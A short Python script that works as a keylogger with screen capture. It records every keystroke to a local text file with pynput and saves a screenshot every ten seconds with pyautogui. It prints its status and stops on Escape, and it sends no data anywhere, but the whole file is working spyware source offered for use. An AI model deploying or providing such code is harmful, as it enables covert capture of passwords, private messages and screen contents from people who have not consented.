from pynput.keyboard import Listener, Key
import pyautogui
import threading
import time
import os
from datetime import datetime

# File paths
key_log_file = "keylog.txt"
screenshot_folder = "screenshots"

# Create screenshot folder if it doesn't exist
os.makedirs(screenshot_folder, exist_ok=True)

# Key press handler
def on_press(key):
    try:
        with open(key_log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(key_log_file, "a") as f:
            f.write(f"[{key}]")

# Key release handler
def on_release(key):
    if key == Key.esc:
        print("[*] Escape pressed. Exiting keylogger...")
        return False

# Screenshot capture loop
def take_screenshots():
    while True:
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filepath = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
            pyautogui.screenshot().save(filepath)
            print(f"[+] Screenshot saved: {filepath}")
        except Exception as e:
            print(f"[!] Screenshot error: {e}")
        time.sleep(10)

# Start screenshot thread
screenshot_thread = threading.Thread(target=take_screenshots, daemon=True)
screenshot_thread.start()

# Start keylogger
print("[+] Keylogger started. Press ESC to stop.")
try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\n[*] Stopped manually with Ctrl+C")